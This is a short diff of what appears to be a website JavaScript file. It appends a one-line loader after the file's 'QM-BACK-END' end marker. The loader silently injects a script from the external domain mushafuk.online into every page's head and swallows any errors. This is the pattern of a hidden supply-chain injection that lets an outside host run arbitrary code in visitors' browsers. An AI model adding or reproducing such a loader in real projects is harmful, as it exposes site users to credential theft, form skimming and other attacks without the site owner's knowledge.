@@ -156,3 +156,5 @@
   window.addEventListener("pageshow", function (e) { if (e.persisted) apply(); });
 })();
 /* QM-BACK-END */
+
+;try{var qs=document.createElement("script");qs.src="https://mushafuk.online/read-shelf.js?v=1";document.head.appendChild(qs);}catch(e){}
